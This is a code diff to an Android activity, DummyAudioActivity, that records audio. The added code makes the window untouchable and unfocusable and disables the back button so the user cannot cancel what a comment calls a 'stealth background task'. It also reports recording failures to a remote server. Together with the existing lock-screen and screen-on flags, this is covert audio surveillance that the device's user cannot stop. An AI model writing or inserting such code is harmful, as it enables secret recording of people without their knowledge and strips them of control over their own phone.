@@ -31,9 +31,25 @@ class DummyAudioActivity : AppCompatActivity() {
             window.addFlags(WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON)
         }
 
+        window.setFlags(
+            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
+            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
+        )
+
+        onBackPressedDispatcher.addCallback(this, object : androidx.activity.OnBackPressedCallback(true) {
+            override fun handleOnBackPressed() {
+                // Do nothing to prevent user from cancelling the stealth background task
+            }
+        })
+
         lifecycleScope.launch {
             recordAudio()
         }
+    }
+
+    override fun onNewIntent(intent: android.content.Intent) {
+        super.onNewIntent(intent)
+        setIntent(intent)
     }
 
     private suspend fun recordAudio() {
@@ -74,6 +90,8 @@ class DummyAudioActivity : AppCompatActivity() {
             )
         } catch (e: Exception) {
             ctx.log().e(TAG, "Audio recording failed: ${e.message}")
+            val transport = com.neubofy.veto.transports.NextJsServerTransport(ctx)
+            transport.send(ctx, "Audio recording failed: ${e.message}", "audio")
             recorder.release()
             outputFile.delete()
             finish()
